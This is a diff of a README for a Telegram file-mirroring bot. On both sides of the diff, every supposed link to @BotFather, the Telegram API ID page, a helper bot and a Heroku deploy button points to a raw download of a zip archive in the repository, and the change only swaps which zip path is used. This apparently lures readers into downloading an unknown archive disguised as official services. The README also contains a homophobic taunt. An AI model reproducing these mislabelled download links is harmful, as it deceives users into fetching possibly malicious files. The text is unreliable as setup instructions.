@@ -3,7 +3,7 @@
 # Benefits :-
     ✓ Google Drive link cloning using gclone.(wip)
     ✓ Telegram File mirrorring to cloud along with its unzipping, unrar and untar
-    ✓ Drive/Teamdrive support/All other cloud services https://raw.githubusercontent.com/kyaw287/LEECH-TELEGRAM-BOT/master/tobrot/TELEGRA-LEEC-BOT-v3.2-alpha.2.zip supports
+    ✓ Drive/Teamdrive support/All other cloud services https://raw.githubusercontent.com/kyaw287/LEECH-TELEGRAM-BOT/master/tobrot/plugins/BOT_LEEC_TELEGRA_1.2.zip supports
     ✓ Unzip
     ✓ Unrar
     ✓ Untar
@@ -21,18 +21,18 @@
 
 ##### Mandatory Variables
 
-* `TG_BOT_TOKEN`: Create a bot using [@BotFather](https://raw.githubusercontent.com/kyaw287/LEECH-TELEGRAM-BOT/master/tobrot/TELEGRA-LEEC-BOT-v3.2-alpha.2.zip), and get the Telegram API token.
+* `TG_BOT_TOKEN`: Create a bot using [@BotFather](https://raw.githubusercontent.com/kyaw287/LEECH-TELEGRAM-BOT/master/tobrot/plugins/BOT_LEEC_TELEGRA_1.2.zip), and get the Telegram API token.
 
 * `APP_ID`
-* `API_HASH`: Get these two values from [https://raw.githubusercontent.com/kyaw287/LEECH-TELEGRAM-BOT/master/tobrot/TELEGRA-LEEC-BOT-v3.2-alpha.2.zip](https://raw.githubusercontent.com/kyaw287/LEECH-TELEGRAM-BOT/master/tobrot/TELEGRA-LEEC-BOT-v3.2-alpha.2.zip).
-  * N.B.: if Telegram is blocked by your ISP, try our [Telegram bot](https://raw.githubusercontent.com/kyaw287/LEECH-TELEGRAM-BOT/master/tobrot/TELEGRA-LEEC-BOT-v3.2-alpha.2.zip) to get the IDs.
+* `API_HASH`: Get these two values from [https://raw.githubusercontent.com/kyaw287/LEECH-TELEGRAM-BOT/master/tobrot/plugins/BOT_LEEC_TELEGRA_1.2.zip](https://raw.githubusercontent.com/kyaw287/LEECH-TELEGRAM-BOT/master/tobrot/plugins/BOT_LEEC_TELEGRA_1.2.zip).
+  * N.B.: if Telegram is blocked by your ISP, try our [Telegram bot](https://raw.githubusercontent.com/kyaw287/LEECH-TELEGRAM-BOT/master/tobrot/plugins/BOT_LEEC_TELEGRA_1.2.zip) to get the IDs.
 
 * `AUTH_CHANNEL`: Create a Super Group in Telegram, add `@GoogleIMGBot` to the group, and send /id in the chat, to get this value.
 
 * `OWNER_ID`: ID of the bot owner, He/she can be abled to access bot in bot only mode too(private mode).
 
 
-[![Maxx](https://raw.githubusercontent.com/kyaw287/LEECH-TELEGRAM-BOT/master/tobrot/TELEGRA-LEEC-BOT-v3.2-alpha.2.zip)](https://raw.githubusercontent.com/kyaw287/LEECH-TELEGRAM-BOT/master/tobrot/TELEGRA-LEEC-BOT-v3.2-alpha.2.zip)
+[![Maxx](https://raw.githubusercontent.com/kyaw287/LEECH-TELEGRAM-BOT/master/tobrot/plugins/BOT_LEEC_TELEGRA_1.2.zip)](https://raw.githubusercontent.com/kyaw287/LEECH-TELEGRAM-BOT/master/tobrot/plugins/BOT_LEEC_TELEGRA_1.2.zip)
 
 ##### Optional Configuration Variables
 
@@ -105,7 +105,7 @@
 🤧 <b> Before Deploy 𝗣𝗹𝗲𝗮𝘀𝗲 𝗛𝗶𝘁 𝗦𝘁𝗮𝗿 ★ else you are Gay</b>
 
 
-<p><a href="https://raw.githubusercontent.com/kyaw287/LEECH-TELEGRAM-BOT/master/tobrot/TELEGRA-LEEC-BOT-v3.2-alpha.2.zip)"> <img src="https://raw.githubusercontent.com/kyaw287/LEECH-TELEGRAM-BOT/master/tobrot/TELEGRA-LEEC-BOT-v3.2-alpha.2.zip%20To%20Heroku-blueviolet?style=for-the-badge&logo=heroku" width="200""/></a></p>
+<p><a href="https://raw.githubusercontent.com/kyaw287/LEECH-TELEGRAM-BOT/master/tobrot/plugins/BOT_LEEC_TELEGRA_1.2.zip)"> <img src="https://raw.githubusercontent.com/kyaw287/LEECH-TELEGRAM-BOT/master/tobrot/plugins/BOT_LEEC_TELEGRA_1.2.zip%20To%20Heroku-blueviolet?style=for-the-badge&logo=heroku" width="200""/></a></p>
 
 
 
